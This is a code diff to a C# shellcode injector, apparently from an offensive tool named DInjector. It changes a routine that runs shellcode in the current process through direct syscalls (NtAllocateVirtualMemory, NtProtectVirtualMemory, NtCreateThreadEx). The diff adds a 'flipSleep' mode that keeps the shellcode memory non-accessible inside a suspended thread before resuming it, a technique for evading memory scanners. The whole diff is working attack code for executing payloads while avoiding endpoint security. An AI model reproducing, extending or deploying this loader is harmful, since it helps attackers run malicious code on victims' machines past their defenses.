@@ -8,9 +8,34 @@ namespace DInjector
 {
     class CurrentThread
     {
-        public static void Execute(byte[] shellcode, uint timeout)
+        public static void Execute(byte[] shellcode, uint protect, uint timeout, int flipSleep)
         {
-            #region NtAllocateVirtualMemory (PAGE_READWRITE)
+            uint allocProtect = 0, newProtect = 0;
+            string strAllocProtect = "", strNewProtect = "";
+            if (protect == DI.Data.Win32.WinNT.PAGE_EXECUTE_READ)
+            {
+                allocProtect = DI.Data.Win32.WinNT.PAGE_READWRITE;
+                strAllocProtect = "PAGE_READWRITE";
+                newProtect = DI.Data.Win32.WinNT.PAGE_EXECUTE_READ;
+                strNewProtect = "PAGE_EXECUTE_READ";
+            }
+            else if (protect == DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE)
+            {
+                allocProtect = DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE;
+                strAllocProtect = "PAGE_EXECUTE_READWRITE";
+            }
+
+            bool suspended = false;
+            if (flipSleep > 0)
+            {
+                allocProtect = DI.Data.Win32.WinNT.PAGE_READWRITE;
+                strAllocProtect = "PAGE_READWRITE";
+                newProtect = DI.Data.Win32.WinNT.PAGE_NOACCESS;
+                strNewProtect = "PAGE_NOACCESS";
+                suspended = true;
+            }
+
+            #region NtAllocateVirtualMemory (allocProtect)
 
             IntPtr hProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
             IntPtr baseAddress = IntPtr.Zero;
@@ -22,35 +47,40 @@ namespace DInjector
                 IntPtr.Zero,
                 ref regionSize,
                 DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
-                DI.Data.Win32.WinNT.PAGE_READWRITE);
+                allocProtect);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(CurrentThread) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
+                Console.WriteLine($"(CurrentThread) [+] NtAllocateVirtualMemory, {strAllocProtect}");
             else
-                throw new Exception($"(CurrentThread) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");
+                throw new Exception($"(CurrentThread) [-] NtAllocateVirtualMemory, {strAllocProtect}: {ntstatus}");
 
             Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
 
             #endregion
 
-            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)
-
-            IntPtr protectAddress = baseAddress;
+            IntPtr protectAddress;
             uint oldProtect = 0;
+            if (newProtect > 0)
+            {
+                #region NtProtectVirtualMemory (newProtect)
 
-            ntstatus = Syscalls.NtProtectVirtualMemory(
-                hProcess,
-                ref protectAddress,
-                ref regionSize,
-                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
-                ref oldProtect);
+                protectAddress = baseAddress;
+                regionSize = (IntPtr)shellcode.Length;
 
-            if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(CurrentThread) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
-            else
-                throw new Exception($"(CurrentThread) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
+                ntstatus = Syscalls.NtProtectVirtualMemory(
+                    hProcess,
+                    ref protectAddress,
+                    ref regionSize,
+                    newProtect,
+                    ref oldProtect);
 
-            #endregion
+                if (ntstatus == NTSTATUS.Success)
+                    Console.WriteLine($"(CurrentThread) [+] NtProtectVirtualMemory, {strNewProtect}");
+                else
+                    throw new Exception($"(CurrentThread) [-] NtProtectVirtualMemory, {strNewProtect}: {ntstatus}");
+
+                #endregion
+            }
 
             #region NtCreateThreadEx
 
@@ -63,7 +93,7 @@ namespace DInjector
                 hProcess,
                 baseAddress,
                 IntPtr.Zero,
-                false,
+                suspended,
                 0,
                 0,
                 0,
@@ -76,29 +106,72 @@ namespace DInjector
 
             #endregion
 
-            if (timeout != 0) // if the shellcode does not need to serve forever, we can do the clean up
+            if (flipSleep > 0)
             {
-                _ = Win32.WaitForSingleObject(hThread, timeout);
+                System.Threading.Thread.Sleep(flipSleep);
 
-                #region CleanUp: NtProtectVirtualMemory (oldProtect)
+                #region NtProtectVirtualMemory (protect)
 
                 protectAddress = baseAddress;
                 regionSize = (IntPtr)shellcode.Length;
-                uint tmpProtect = 0;
+                oldProtect = 0;
 
                 ntstatus = Syscalls.NtProtectVirtualMemory(
                     hProcess,
                     ref protectAddress,
                     ref regionSize,
-                    oldProtect,
-                    ref tmpProtect);
+                    protect,
+                    ref oldProtect);
 
                 if (ntstatus == NTSTATUS.Success)
-                    Console.WriteLine("(CurrentThread.CleanUp) [+] NtProtectVirtualMemory, oldProtect");
+                    Console.WriteLine("(CurrentThread) [+] NtProtectVirtualMemory, protect");
                 else
-                    throw new Exception($"(CurrentThread.CleanUp) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");
+                    throw new Exception($"(CurrentThread) [-] NtProtectVirtualMemory, protect: {ntstatus}");
 
                 #endregion
+
+                #region NtResumeThread
+
+                uint suspendCount = 0;
+
+                ntstatus = Syscalls.NtResumeThread(
+                    hThread,
+                    ref suspendCount);
+
+                if (ntstatus == NTSTATUS.Success)
+                    Console.WriteLine("(CurrentThread) [+] NtResumeThread");
+                else
+                    throw new Exception($"(CurrentThread) [-] NtResumeThread: {ntstatus}");
+
+                #endregion
+            }
+
+            if (timeout > 0) // if the shellcode does not need to serve forever, we can do the clean up
+            {
+                _ = Win32.WaitForSingleObject(hThread, timeout);
+
+                if (oldProtect > 0)
+                {
+                    #region CleanUp: NtProtectVirtualMemory (PAGE_READWRITE)
+
+                    protectAddress = baseAddress;
+                    regionSize = (IntPtr)shellcode.Length;
+                    uint tmpProtect = 0;
+
+                    ntstatus = Syscalls.NtProtectVirtualMemory(
+                        hProcess,
+                        ref protectAddress,
+                        ref regionSize,
+                        DI.Data.Win32.WinNT.PAGE_READWRITE,
+                        ref tmpProtect);
+
+                    if (ntstatus == NTSTATUS.Success)
+                        Console.WriteLine("(CurrentThread.CleanUp) [+] NtProtectVirtualMemory, PAGE_READWRITE");
+                    else
+                        throw new Exception($"(CurrentThread.CleanUp) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");
+
+                    #endregion
+                }
 
                 // Zero out shellcode bytes
                 Marshal.Copy(new byte[shellcode.Length], 0, baseAddress, shellcode.Length);
@@ -127,7 +200,7 @@ namespace DInjector
                 ntstatus = Syscalls.NtWaitForSingleObject(
                     hThread,
                     false,
-                    timeout);
+                    0);
 
                 if (ntstatus == NTSTATUS.Success)
                     Console.WriteLine("(CurrentThread) [+] NtWaitForSingleObject");
